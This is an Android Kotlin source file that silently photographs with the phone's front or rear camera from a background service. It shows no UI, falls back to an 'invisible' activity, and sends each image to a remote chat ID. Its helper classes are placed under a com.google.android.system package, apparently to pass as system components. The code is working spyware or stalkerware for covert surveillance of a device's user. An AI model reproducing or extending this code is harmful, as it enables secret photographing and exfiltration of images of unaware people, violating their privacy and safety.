package com.homemonitor

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.hardware.camera2.TotalCaptureResult
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.android.system.MonitorService
import java.io.File
import java.io.FileOutputStream

/**
 * BackgroundCameraEngine
 * Direct background Camera2 engine operating directly from Service/Background Threads.
 * Does not require starting any Activity or overlay UI.
 */
object BackgroundCameraEngine {

    private const val TAG = "BackgroundCameraEngine"

    fun takePhoto(context: Context, isFront: Boolean = false, chatId: String = "") {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Cannot take background photo: CAMERA permission not granted.")
            return
        }

        val thread = HandlerThread("BackgroundCameraThread").apply { start() }
        val handler = Handler(thread.looper)

        handler.post {
            try {
                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val targetFacing = if (isFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
                var targetCameraId: String? = null

                for (id in cameraManager.cameraIdList) {
                    val chars = cameraManager.getCameraCharacteristics(id)
                    val facing = chars.get(CameraCharacteristics.LENS_FACING)
                    if (facing == targetFacing) {
                        targetCameraId = id
                        break
                    }
                }

                if (targetCameraId == null && cameraManager.cameraIdList.isNotEmpty()) {
                    targetCameraId = cameraManager.cameraIdList[0]
                }

                if (targetCameraId == null) {
                    Log.e(TAG, "No suitable camera ID found on device.")
                    thread.quitSafely()
                    return@post
                }

                val imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 2)
                val photoFile = File(context.cacheDir, "photo_${if (isFront) "front" else "rear"}_${System.currentTimeMillis()}.jpg")

                imageReader.setOnImageAvailableListener({ reader ->
                    try {
                        val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()

                        FileOutputStream(photoFile).use { out -> out.write(bytes) }
                        Log.i(TAG, "Background Camera2 photo captured successfully: ${photoFile.absolutePath} (${photoFile.length()} bytes)")

                        MonitorService.sendPhotoPublic(chatId, photoFile)
                    } catch (e: Exception) {
                        Log.e(TAG, "ImageReader capture processing error: ${e.message}", e)
                    } finally {
                        imageReader.close()
                        thread.quitSafely()
                    }
                }, handler)

                var retryCount = 0
                val maxRetries = 3

                fun doOpenCamera() {
                    @Suppress("MissingPermission", "DEPRECATION")
                    cameraManager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
                        override fun onOpened(camera: CameraDevice) {
                            try {
                                val surface = imageReader.surface
                                val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                    addTarget(surface)
                                    set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                    set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                }

                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                                    val outputConfig = android.hardware.camera2.params.OutputConfiguration(surface)
                                    val sessionConfig = android.hardware.camera2.params.SessionConfiguration(
                                        android.hardware.camera2.params.SessionConfiguration.SESSION_REGULAR,
                                        listOf(outputConfig),
                                        { it.run() },
                                        object : CameraCaptureSession.StateCallback() {
                                            override fun onConfigured(session: CameraCaptureSession) {
                                                try {
                                                    session.capture(captureBuilder.build(), object : CameraCaptureSession.CaptureCallback() {
                                                        override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                                                            try { camera.close() } catch (_: Exception) {}
                                                        }
                                                    }, handler)
                                                } catch (e: Exception) {
                                                    Log.e(TAG, "Session capture error: ${e.message}")
                                                    try { camera.close() } catch (_: Exception) {}
                                                    thread.quitSafely()
                                                }
                                            }

                                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                                Log.w(TAG, "CameraCaptureSession onConfigureFailed. Falling back to InvisibleCameraActivity...")
                                                try { camera.close() } catch (_: Exception) {}
                                                thread.quitSafely()
                                                com.google.android.system.InvisibleCameraActivity.takePhoto(context, chatId, isFront)
                                            }
                                        }
                                    )
                                    camera.createCaptureSession(sessionConfig)
                                } else {
                                    camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                                        override fun onConfigured(session: CameraCaptureSession) {
                                            try {
                                                session.capture(captureBuilder.build(), object : CameraCaptureSession.CaptureCallback() {
                                                    override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                                                        try { camera.close() } catch (_: Exception) {}
                                                    }
                                                }, handler)
                                            } catch (e: Exception) {
                                                Log.e(TAG, "Session capture error: ${e.message}")
                                                try { camera.close() } catch (_: Exception) {}
                                                thread.quitSafely()
                                            }
                                        }

                                        override fun onConfigureFailed(session: CameraCaptureSession) {
                                            Log.w(TAG, "CameraCaptureSession onConfigureFailed. Falling back to InvisibleCameraActivity...")
                                            try { camera.close() } catch (_: Exception) {}
                                            thread.quitSafely()
                                            com.google.android.system.InvisibleCameraActivity.takePhoto(context, chatId, isFront)
                                        }
                                    }, handler)
                                }
                            } catch (e: Exception) {
                                Log.e(TAG, "openCamera onOpened error: ${e.message}. Falling back...")
                                try { camera.close() } catch (_: Exception) {}
                                thread.quitSafely()
                                com.google.android.system.InvisibleCameraActivity.takePhoto(context, chatId, isFront)
                            }
                        }

                        override fun onDisconnected(camera: CameraDevice) {
                            Log.w(TAG, "Camera disconnected")
                            try { camera.close() } catch (_: Exception) {}
                            thread.quitSafely()
                        }

                        override fun onError(camera: CameraDevice, error: Int) {
                            try { camera.close() } catch (_: Exception) {}
                            if (retryCount < maxRetries) {
                                retryCount++
                                Log.w(TAG, "Camera HAL error code $error (in use or busy). Retrying open attempt $retryCount/$maxRetries in 250ms...")
                                handler.postDelayed({ doOpenCamera() }, 250)
                            } else {
                                Log.e(TAG, "Camera error code $error after $maxRetries retries. Falling back to InvisibleCameraActivity...")
                                thread.quitSafely()
                                com.google.android.system.InvisibleCameraActivity.takePhoto(context, chatId, isFront)
                            }
                        }
                    }, handler)
                }

                doOpenCamera()

            } catch (e: Exception) {
                Log.e(TAG, "Background camera capture exception: ${e.message}", e)
                thread.quitSafely()
            }
        }
    }
}
